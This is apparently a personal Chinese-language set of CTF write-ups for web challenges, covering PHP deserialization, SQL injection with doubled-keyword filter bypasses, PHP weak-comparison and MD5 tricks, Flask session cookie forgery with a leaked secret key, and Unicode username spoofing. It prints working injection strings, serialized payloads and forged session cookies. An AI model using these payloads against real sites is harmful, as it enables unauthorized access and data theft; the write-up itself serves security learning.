**private属性被序列化后属性值会变成`%00类名%00属性名`,则需在创造对象后根据规则进行修改，长度也要加上%00**

payload1：

```
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

![image-20220217220200027](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220217220200027.png)

==**注意❗⚠：可以进行url编码，防止%00对应的不可打印字符在复制时丢失**==，payload2：

```php
#未编码直接序列化private：
//O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}  //无法成功
echo urlencode(serialize($a));
#编码后：可以成功得到flag
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
#再将Name后面的2换成3或其他值即可
```



## [极客大挑战 2019]BabySQL

#### 考点：关键词替换为空后回显部分数据

#### 万能密码，位置？

> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。
>
> 要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。
>
> 当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
> 当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）
>
> **只要'or'后面的字符串为一个非零的数字开头都会返回True**
>
> ```
> select * from `admin` where password=''or'1abcdefg'    --->  True
> select * from `admin` where password=''or'0abcdefg'    --->  False
> select * from `admin` where password=''or'1'           --->  True
> select * from `admin` where password=''or'2'           --->  True
> select * from `admin` where password=''or'0'           --->  False
> ```

用户名输入admin,密码栏输入万能密码`amin'or'1`，发现不对，NO,Wrong username password！！！【==**后续发现这里就可以猜出是replace了关键字，不然不可能回显密码错误，而应该爆出账号密码**==】

密码输入`admin'`，回显error，密码输入`amin'#`，回显NO,Wrong username password！！！，说明密码这存在字符注入

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218143127168.png" alt="image-20220218143127168" style="zoom:67%;" />

用户名输入`1′ or 1=1 or '1'='1`，密码admin，回显Error，说明用户名出存在字符注入

![image-20220218142842677](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218142842677.png)

但是这个回显为什么只回显一部分?不懂，搜wp猜测是删掉了关键词

比如password输入or，回显没输入password，说明删掉了（过滤）关键词or，`oror`，也不行，`oorr`可以绕过，印证猜测，就是把关键词换位空

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220222121231.png" alt="image-20220220222121231" style="zoom: 50%;" />

然后重新输入万能密码，发现成功登录

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221001708538.png" alt="image-20220221001708538" style="zoom:50%;" />

```
check.php?username=admin&password=admin' oorr '1'='1
```



1. 猜测列数，order和by都被过滤==》双写

   ```
   check.php?username=admin&password=1'oorrder bbyy 4 --+  //报错Unknown column '4' in 'order clause'
   check.php?username=admin&password=1'oorrder bbyy 3--+  //NO,Wrong username password！！！说明有3列
   ```

2. 猜测位置，同理，只输入union select 1,2,3，报错version for the right syntax to use near '1,2,3-- '' at line 1，说明<span style="background:#FF9999;">吞了</span>union和select，同样用双写绕过

   <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220233828652.png" alt="image-20220220233828652" style="zoom:67%;" />

   ```
   check.php?username=admin&password=1'uunionnion sselectelect 1,2,3--+  //发现回显位置2,3
   ```

   3. 爆数据库名：geek

      ```
      check.php?username=admin&password=1'uunionnion sselectelect 1,database(),3--+
      ```

   4. 爆所有库：Your password is 'information_schema,mysql,performance_schema,test,ctf,geek'  //可疑库：ctf

      ```
      check.php?username=admin&password=1'uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata--+  // use near '.schemata,3-- '' at line 1
      ```

      **注意❗information.schema被过滤可能因为information里的or，而不是整个information被过滤**

#### 如何测试那些关键词被过滤？用什么代替？

先在password单独测试关键词，例如password输入from，回显Input your username and password，说明被吞==》输入ffromrom，回显NO,Wrong username password！！！，成功绕过 ==》**<span style="background:#FF9999;">先测试关键词+绕过方法再注入，不然不知道是哪个词出现了问题</span>**

或者知道几列后，在某个位置用''直接回显，看他是不是自己，印证猜想：replace关键词为空

```
1'uunionnion sselectelect 1,'information',3--+
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220235721090.png" alt="image-20220220235721090" style="zoom:67%;" />

5. 爆表名：'b4bsql,geekuser'

   ```
   1'uunionnion sselectelect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+
   ```

6. 爆列名：'id,username,password'

   ```
   1'uunionnion sselectelect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name='b4bsql'--+   //注意❗要加引号
   ```

7. 爆具体数据

   ```
   1'uunionnion sselectelect 1,2,group_concat(concat_ws('--',id,username,passwoorrd)) ffromrom b4bsql--+
   ```

   '1--cl4y--i_want_to_play_2077,2--sql--sql_injection_is_so_fun,3--porn--do_you_know_pornhub,4--git--github_is_different_from_pornhub,5--Stop--you_found_flag_so_stop,6--badguy--i_told_you_to_stop,7--hacker--hack_by_cl4y,8--flag--flag{4a2ddb62-9290-4b79-bce5-c2222e134275}'

得到flag



## [ACTF2020 新生赛]BackupFile(简单)

#### 考点：备份文件、弱类型比较：数字相等

御剑扫到index.php.bak，得到源码

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221234847834.png" alt="image-20220221234847834" style="zoom: 67%;" />

```php
<?php
include_once "flag.php";
if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {  //key得是数字
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {   //弱类型比较
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

**弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行**

弱类型比较跟123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3相等即可==》数字，123



## [BJDCTF2020]Easy MD5

#### 考点：md5弱类型+强类型都考了、F12网络抓包看hint

一开始找不到要干啥，找WP发现，输入1，F12查看网络，得到提示/burp抓包也能看到，Hint: select * from 'admin' where password=md5($pass,true)

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222000509201.png" alt="image-20220222000509201" style="zoom:67%;" />

***md5(string,raw):可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式，FALSE - 默认。32 字符十六进制数***

万能密码：

```
1'or'1
```

得找到某个东西使它md5 二进制后为万能密码，，看WP

1. ffifdyop，md5 二进制后是`'or'6�]��!r,��b`

> 这里提供一个==**最常用的：ffifdyop**==，该字符串md5加密后若raw参数为True时会返回` 'or'6<trash>` (`<trash>`其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的`<trash>`会在MySQL将其转换成整型比较时丢掉)

![image-20220222001300948](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001300948.png)

2. 输入后跳转到/levels91.php

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001617105.png" alt="image-20220222001617105" style="zoom:67%;" />

查看源码得到php

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

**典型的md5碰撞，**要求ab不同但md5相同，弱类型比较，**弱类型比较 可以通过两个0e开头的md5绕过**

**这里提供一些md5以后是0e开头的值：**【更多参考[wp](https://www.jianshu.com/p/c5b05c766906)】

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904
```

构造levels91.php?a=QNKCDZO&b=s878926199a，发现又跳转到新的页面levell14.php

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

强类型比较，需要1.强碰撞：**找到两个md5值相同的字符串即可**/2.绕过：**数组绕过**

```php
md5(array()) = null

//更多：
sha1(array()) = null    
ereg(pattern,array()) = null vs preg_match(pattern,array) = false
strcmp(array(), "abc") = null
strpos(array(),"abc") = null
```

payload：

```
param1[]=&param2[]=2
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222002727828.png" alt="image-20220222002727828" style="zoom: 67%;" />

#### 如何找到特定开头的md5值？

> [**大佬博客](https://www.cnblogs.com/yesec/p/12535534.html)

```php
<?php 
for ($i = 0;;) { 
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo "\nmd5($i) = " . md5($i, true) . "\n";
 echo ".";
}
?>

//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/
```



## [HCTF 2018]admin(**)

#### 考点:flask、客户端session伪造

> [csdn三种解法WP](https://blog.csdn.net/weixin_44677409/article/details/100733581)
>
> 更多：[flask漏洞利用小结](https://inhann.top/2021/02/25/flask_newer/)
>
> 参考：[**详细，易懂，适合小白+CTF各种过滤绕过姿势**](https://xz.aliyun.com/t/3679)

#### Flask

==Flask==：一个用Python编写的轻量级Web应用框架。基于Werkzeug WSGI工具箱和Jinja2模板引擎。

参考：https://www.jianshu.com/p/d537d634df7b

​	总结一下，Flask处理一个请求的流程就是，首先根据 URL 决定由那个函数来处理，然后在函数中进行操作，取得所需的数据。再将数据传给相应的模板文件中，由Jinja2 负责渲染得到 HTTP 响应内容，然后由Flask返回响应内容。

- 注意

  render_template()是用来渲染一个指定的文件的。使用如下：return render_template('index.html') render_template_string则是用来渲染一个字符串的。**SSTI与这个方法密不可分**。

​			**简单来说也就是不正确的使用flask中的render_template_string方法会引发SSTI。**



1. **根据题目提示的admin,猜测是不是要让我用admin来登录这个网站？然后我在login界面输入用户名”admin“,密码”123“（弱口令）结果成功登录得到flag**
2. 常规做法：先注册用户，登录用户后在修改密码查看源码，发现提示flask==>框架，从GitHub上down源码

![image-20220223143114609](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223143114609.png)

3. 看到源码尝试模板注入，注册用户时regester.html有双大括号

   <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184440886.png" alt="image-20220304184440886" style="zoom: 67%;" />

   发现不行，并不响应

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184231019.png" alt="image-20220304184231019" style="zoom:50%;" />

而所有的传参form都经过了NewpasswordForm，转到定义，看不出来啥，猜测是被过滤了==》后续查看模板注入，发现**只有render_template_string会导致注入**，而且模板文件若已有`{% raw %}{{}}{% endraw %}`,则无法产生注入，而模板语言无`{% raw %}{{}}{% endraw %}`，输入参数可以`{% raw %}{{}}{% endraw %}`的话就可以，参考https://xz.aliyun.com/t/3679

> **两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)【参数可控】，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果使用render_template函数，将url里写自己想要的恶意代码`{% raw %}{{}}{% endraw %}`传入进去并不会执行【良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了，参数已经不可控】**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304185102492.png" alt="image-20220304185102492" style="zoom:67%;" />

3. 查看源码，在index.html得到flag的相关信息

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223145017072.png" alt="image-20220223145017072" style="zoom: 50%;" />

要求current_user.is_authenticated and session['name'] == 'admin'



#### flask_session伪造

> [客户端 session 导致的安全问题、flask](https://www.leavesongs.com/PENETRATION/client-session-security.html#)
>
> [Flask客户端session伪造](https://chenlvtang.top/2021/02/01/Flask%E5%AE%A2%E6%88%B7%E7%AB%AFsession%E4%BC%AA%E9%80%A0/)

**一般session会被保存到服务端中（服务端cookie，但是flask的session是存储在客户端的cookie里的**

![img](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/6277797-c018a4c5b5be1541.png)

> flask对session的处理位于flask/sessions.py中（本题没找到），默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。

session一般格式：

![img](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/t01ef54ad8392df284d.png)

```
.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw
```

通过.隔开的**3段内容**，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。

```php
json->zlib->base64后的源字符串 . 时间戳 . hmac签名信息
```

- 服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。

- 漏洞成因
   漏洞的根源是**secretkey被获取**，应当使用完全随机的secretkey，或在clone某项目后修改为随机的key。
   **需要特别注意的是python2与python3下产生的timestamp是不一样的！**
- ==生成 session cookie 需要 secret_key 解码 session cookie 可以不需要 secret_key==

- **利用工具：**

​			https://github.com/noraj/flask-session-cookie-manager

​			**由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的**`secret_key`**，一旦获取到**`secret_key`**, 我们就可以轻松的构造签名，从而实现客户端的session的伪造。**

- **安装问题**：[参考博客](https://chenlvtang.top/2020/07/28/Flask%E3%81%AE%E5%88%9D%E8%AF%86/)，安装完后出现helloworld后退出虚拟环境，直接运行脚本【注意，虚拟环境里设置的脚本是python.exe所以用法是python flask_xxx而不是python3 flask_xxx】

cmd直接执行某文件夹下的exe：

```
"D:\Work\vscode\Microsoft VS Code\_\Code.exe"    //路径有空格情况下要加书昂引号
```

用法：

解密: `python flask_session_manager.py decode -s SECRET_KEY -c session`

加密: `python flask_session_manager.py encode -s SECRET_KEY -t 未加密session`

```python
加密：【必须要有secret_key】
$ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&sp&77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'
==》eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw

解密：【可有可无key】
有key:
$ python{2,3} flask_session_cookie_manager{2,3}.py decode -c 'eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw' -s '.{y]tR&sp&77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d'
==》{u'username': 'admin', u'number': '326410031505'}

无kwy：
$ python{2,3} flask_session_cookie_manager{2,3}.py decode -c 'eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw'
==》{"number":{" b":"MzI2NDEwMDMxNTA1"},"username":{" b":"YWRtaW4="}}
```



注册用户abc，密码123，F12抓包得到session

```
session=.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_751F3aP7837HjPzYMtt154cm5y7Sztiy_0nmzzY25pNGIiFt0JG9DBGtXAg6rTUszH2eV8KGaB3DgzcStME0EXAWGUQc05mIJT01H8EinVmReFQ15y0jcjzjEwRrK8SVI23Zn61Hu7WUIpi0AoPKOSBTH5DPcvA0N3qalyaeYZ6l6DecKvqd_IyoJhz0HWKOkzZc8Q2p267PH-F9vh_Qmwc8OoGfc3RD1EjA3kb0FMCrzUGPeDXUslIfeFRUQaz6U_dPq527V_T6ugarH4nx1VsX9Z6w0bscmq7n6-xNGHPbzbYaq0.YiIR9A.ANlJjD-W7HclEQHya-wgAX8O9uo; HttpOnly; Path=/
```

要生成session需要secret_key，搜索，在config.py中找到secret_key：ckj123

![image-20220304224727300](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304224727300.png)

解密失败：[Decoding error] Invalid base64-encoded data

<span style="background:#FF9999;">**注意：解密的序列串前的点（.）不能少！而且最好用双引号、有secret_key下用key完全解密，否则解密出来还是base64的**</span>

```bash
python flask_session_cookie_manager3.py decode -c ".eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_751F3aP7837HjPzYMtt154cm5y7Sztiy_0nmzzY25pNGIiFt0JG9DBGtXAg6rTUszH2eV8KGaB3DgzcStME0EXAWGUQc05mIJT01H8EinVmReFQ15y0jcjzjEwRrK8SVI23Zn61Hu7WUIpi0AoPKOSBTH5DPcvA0N3qalyaeYZ6l6DecKvqd_IyoJhz0HWKOkzZc8Q2p267PH-F9vh_Qmwc8OoGfc3RD1EjA3kb0FMCrzUGPeDXUslIfeFRUQaz6U_dPq527V_T6ugarH4nx1VsX9Z6w0bscmq7n6-xNGHPbzbYaq0.YiIR9A.ANlJjD-W7HclEQHya-wgAX8O9uo" -s ckj123

{'_fresh': True, '_id': b'04cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559', 'csrf_token': b'2ea3d13566555adb6d6641bdead5908afc2c4f80', 'image': b'jxU5', 'name': 'abc', 'user_id': '10'}
```

看到用户abc

或者可以直接用p牛的解密脚本，无需key

![image-20220305135431149](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305135431149.png)

试试改为admin，+key生成session：

```cmd
python flask_session_cookie_manager3.py encode -t "{'_fresh': True, '_id': b'04cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559', 'csrf_token': b'2ea3d13566555adb6d6641bdead5908afc2c4f80', 'image': b'jxU5', 'name': 'admin', 'user_id': '10'}" -s ckj123

.eJxFkE-LwjAQxb_KkrOHNtteBA8uMaGFmVJJG5KL-KeaJqYLVVErfvetLuwe35v3e8zMg6z2fXOyZHruL82ErNodmT7Ix4ZMCbClM4wHdJCiWFpgVVzIeYpDNhSMexisBQW3QtUeZO4xlAmEjGo1EoI7PXx5HarEsNyirKiWJiDNEq1yb1wZoaidUYurcXA3SsfIRi3wiIwftcpuKOcJKH03skwLtUhQHiKUW2pE9akd98gWFGQVo_Qz8pyQ7anfr87fvun-Twi1BVreYKgoujGquNfOeHQ6gtcaox7xayF40EPuUOgE5rN3XRvWh-avad3ZGsvfSbcOzcvahbYjE3I5Nf37bySOyPMHEwhrkA.YiIoxQ.1STJCvyLZME_COi7806tpsQssx4
```

提交伪造session得到flag

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304225810232.png" alt="image-20220304225810232" style="zoom: 67%;" />



#### unicode欺骗

> 参考：
>
> https://darkwing.moe/2019/11/04/HCTF-2018-admin/
>
> 更多，包含其他字符欺骗（**idna** ）+php变量绕过：https://www.geek-share.com/detail/2798492491.html

查看源码，发现各种操作：注册，登录，修改密码，都会先对用户名小写

```
name = strlower(form.username.data)
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305140113647.png" alt="image-20220305140113647" style="zoom:67%;" />

函数定义：

```python
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

而nodeprep是个库，from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，而源码导入的版本是10.2.0，而官网最新的版本是22.2.0，这么老的版本肯定会有漏洞

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141538923.png" alt="image-20220305141538923" style="zoom:67%;" />

![image-20220305141458847](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141458847.png)

- 漏洞成因：

unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作

```
ᴬ -> A -> a
即该函数调用第一次将其转换为大写，第二次将其转换为小写
```

**所以当我们用`ᴬdmin`注册的话，后台代码调用一次nodeprep.prepare函数，添加用户Admin+密码**

**我们用`ᴬdmin`进行登录，后台代码调用一次nodeprep.prepare函数，后台以为登陆的用户是Admin，检查有无这个用户+密码正确与否，然后登录成功后`session['name']=Admin`，可以看到index页面的username变成了Admin**

**登陆状态下修改密码，后台代码`  name = strlower(session['name'])`,对session['name']调用一次nodeprep.prepare函数，name变为`admin`,然后修改用户为admin的密码**

那么，攻击链大概就这样

- 注册用户ᴬdmin
- 登录用户ᴬdmin，变成Admin
- 修改密码Admin，更改了admin的密码

在index.html中可以看到只要`session['name']=='admin'`,也就是只要用户名是`admin`就可成功登录了

- 具体字母怎么找?

  关于具体编码可查 https://unicode-table.com/en/sets/superscript-and-subscript-letters/，当然你也可以复制过后用站长工具转换成Unicode编码。

  <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305145448969.png" alt="image-20220305145448969" style="zoom:67%;" />





## [护网杯 2018]easy_tornado（**）

#### 考点：cookie_secret、模板注入

![image-20220227192953750](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227192953750.png)

点进界面，打开flag.txt，得到提示flag in /fllllllllllllag

打开welcome.txt，得到提示render

打开hints.txt，得到提示md5(cookie_secret+md5(filename))

然后每次打开文件，url里都有提交参数，filename和filehash

![image-20220227193123613](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227193123613.png)

猜测filehash对应的上filename才能访问，但是cookie_secret是啥呢？

抓包，查看cookie，发现并无cookie

burp抓包flag.txt那个文件，发现304 NOT modified，但是直接访问是可以访问的

![image-20220227194449791](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227194449791.png)

#### 304 NOT modified

> [304 Not Modified](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304)	：304 未改变
>
> [百度百科](https://baike.baidu.com/item/304%E7%8A%B6%E6%80%81%E7%A0%81/7867141)

304（未修改）	:自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。

​	1. 如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应（称为 If-Modified-Since HTTP 标头）。服务器可以告诉 Googlebot 自从上次抓取后网页没有变更，进而节省带宽和开销。

​	2. HTTP 304 未改变说明无需再次传输请求的内容，也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe），例如**GET 或HEAD 或在请求中附带了头部信息： If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。**

​	3. 如果是 200 OK ，响应会带有头部 Cache-Control, Content-Location, Date, ETag, Expires，和 Vary.

#### [啥是 Cache-Control ？](https://zhuanlan.zhihu.com/p/79042406)

​	Cache-Control 是一个 HTTP 协议中关于缓存的响应头，它由一些能够允许你定义一个响应资源应该何时、如何被缓存以及缓存多长时间的指令组成。

##### Cache-Control max-age

这个指令告诉浏览器端或者中间者，响应资源能够在它被请求之后的多长时间以内被复用。例如，`max-age`等于 3600 意味着响应资源能够在接下来的 60 分钟以内被复用，**而不需要从服务端重新获取**。（可以发现，`max-age`的单位是秒）



#### [什么是ETag？](https://juejin.cn/post/6844903870636769293)

Etag是 Entity tag的缩写，可以理解为“被请求变量的实体值”，Etag是服务端的一个资源的标识，在 HTTP 响应头中将其传送到客户端。所谓的服务端资源可以是一个Web页面，也可以是JSON或XML等。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端。**另一种说法是，ETag是一个可以与Web资源关联的记号（token）**

比如，**浏览器第一次请求一个资源的时候，服务端给予返回，并且返回了ETag**: "50b1c1d4f775c61:df3" 这样的字样给浏览器，当浏览器再次请求这个资源的时候，浏览器会将If-None-Match: W/"50b1c1d4f775c61:df3" 【**相同ETag值**】传输给服务端，服务端拿到该ETAG，对比资源是否发生变化，如果资源未发生改变，则返回304HTTP状态码，不返回具体的资源。





解题：

```
1.flag在/fllllllllllllag
2.filehash：md5(cookie_secret+md5(filename))
```

所以我们的差的就是cookie_secret了，下面开始拿cookie_secret

通过源码和请求头并没有看到任何的cookie_secret信息，当我们尝试访问/fllllllllllllag，报错

![image-20220227211937496](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png)

思路断了，看WP才知道与304cache无关。。**题目是easy_tornado，/welcome.txt页面也看到==render==，可能会是SSTI模板注入**





#### 模板注入**

> 参考：[**详细，易懂，适合小白+CTF各种过滤绕过姿势**](https://xz.aliyun.com/t/3679)
>
> [推荐一个能把Python代码给编译成一句话的形式工具](https://github.com/csvoss/onelinerizer)

总结起来就是类似SQL注入，通过控制输入参数得到数据



##### 渲染

- 前端开发过程：

浏览器这边做的工作大致分为以下几步：

加载：根据请求的URL进行域名解析，向服务器发起请求，接收文件（HTML、JS、CSS、图象等）。

解析：对加载到的资源（HTML、JS、CSS等）进行语法解析，建议相应的内部数据结构（比如HTML的DOM树，JS的（对象）属性表，CSS的样式规则等等）

**渲染**：构建渲染树，对各个元素进行位置计算、样式计算等等，然后根据渲染树对页面进行渲染（可以理解为“画”元素）【**绘制**】【**将HTML变成人眼看到的图像**】

这几个过程不是完全孤立的，会有交叉，比如HTML加载后就会进行解析，然后拉取HTML中指定的CSS、JS等。

> 举例子：
>
> 你要吃个菜，你找到厨师说，我要尖椒肉丝。
>
> 厨师就去翻菜谱，炒给你吃。
>
> 你是浏览者
>
> 菜是你将看到的页面
>
> 厨师是浏览器
>
> 菜谱是程序员写的页面代码
>
> 炒菜的过程，就是页面渲染

##### [DOM](https://www.zhihu.com/question/34219998)

DOM是Document Object Model的英文缩写，翻译过来是文档对象模型

当浏览器读到这些代码时，它会建立一个[“DOM 节点”树](https://javascript.info/dom-nodes)来保持追踪所有内容，如同你会画一张家谱树来追踪家庭成员的发展一样，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。【就是把HTML代码转化为树】

**文档对象模型就是基于这样的文档视图结构的一种模型，所有的html页面都逃不开这个模型，也可以把它称为==节点树==更为准确。**



##### 什么是模板

- 这里特指用于 web 开发的模板引擎，是为了用户界面与业务数据（内容）分离而产生的。
  可以生成特定格式的文档，利用模板引擎来生成前端的html代码，反馈给浏览器，呈现在用户面前。
  大概就是一个网页的框架，

- 模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

- 而造成服务器端模板注入漏洞的成因就是服务端接收了用户的恶意输入后，未经任何处理就将其作为 web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，从而导致了敏感信息的泄露、代码执行、getshell 等问题。

##### 什么是框架

> https://www.kancloud.cn/kancloud/python-basic/41708

1. 不管是python，还是php，亦或别的做web项目的语言，乃至于做其它非web项目的**开发**，一般都要用到一个称之为什么什么框架的东西。

2. 简而言之，框架就是制定一套规范或者规则（思想），大家（程序员）在该规范或者规则（思想）下工作。或者说就是**使用别人搭好的舞台，你来做表演**。

3. <span style="background:#BBFFBB;">python常见web框架</span>：

- Django:这是一个被广泛应用的框架，如果看官在网上搜索，会发现很多公司在招聘的时候就说要会这个，其实这种招聘就暴露了该公司的开发水平要求不高。框架只是辅助，真正的程序员，用什么框架，都应该是根据需要而来。当然不同框架有不同的特点，需要学习一段时间。
- ==Flask==：一个用Python编写的轻量级Web应用框架。基于Werkzeug WSGI工具箱和Jinja2模板引擎。
- Web2py：是一个为Python语言提供的全功能Web应用框架，旨在敏捷快速的开发Web应用，具有快速、安全以及可移植的数据库驱动的应用，兼容Google App Engine（这是google的元计算引擎，后面我会单独介绍）。
- Bottle: 微型Python Web框架，遵循WSGI，说微型，是因为它只有一个文件，除Python标准库外，它不依赖于任何第三方模块。
- Tornado：全称是Torado Web Server，从名字上看就可知道它可以用作Web服务器，但同时它也是一个Python Web的开发框架。最初是在FriendFeed公司的网站上使用，FaceBook收购了之后便开源了出来。
- webpy: 轻量级的Python Web框架。webpy的设计理念力求精简（Keep it simple and powerful），源码很简短，只提供一个框架所必须的东西，不依赖大量的第三方模块，它没有URL路由、没有模板也没有数据库的访问。

##### 一些tornado语法：

> [参考手册**](https://www.kancloud.cn/kancloud/python-basic/41713)

render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用

```python
#!/usr/bin/env python
#coding:utf-8

import tornado.httpserver
import tornado.ioloop
import tornado.options
import tornado.web

from tornado.options import define, options
define("port", default=8000, help="run on the given port", type=int)  //指定网页访问的端口

